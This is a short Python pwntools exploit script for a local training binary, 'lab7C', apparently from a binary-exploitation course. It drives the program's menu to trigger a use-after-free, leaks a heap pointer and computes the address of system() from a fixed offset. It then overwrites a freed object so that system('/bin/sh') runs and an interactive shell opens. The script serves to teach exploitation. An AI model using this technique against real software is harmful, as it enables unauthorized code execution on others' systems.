from pwn import *
p = process("./lab7C")

p.recvuntil("Enter Choice: ")
p.sendline("2")
p.sendline("1337") #make number 1337
p.recvuntil("Enter Choice: ")
p.sendline("4") #delete a number
p.recvuntil("Enter Choice: ")
p.sendline("1")
p.sendline("/bin/sh")
p.recvuntil("Enter Choice: ")
p.sendline("6")
p.sendline("1")

# --> output contains address of small_str
ret = p.recvuntil("Enter Choice: ")
addr_small_str = int (ret[ret.index("enough")+8:ret.index("\n")])
log.info("addr_small_str: " + hex(addr_small_str))

# --> calculate actutal address of system

addr_system = addr_small_str - 0x19da37

# --> call system("/bin/sh")
p.sendline("3") #delete a string
p.recvuntil("Enter Choice: ")
p.sendline("2") # make a number
p.sendline(str(addr_system))
p.recvuntil("Enter Choice: ")
p.sendline("5")
p.sendline("1")
p.recv(100)
p.interactive()
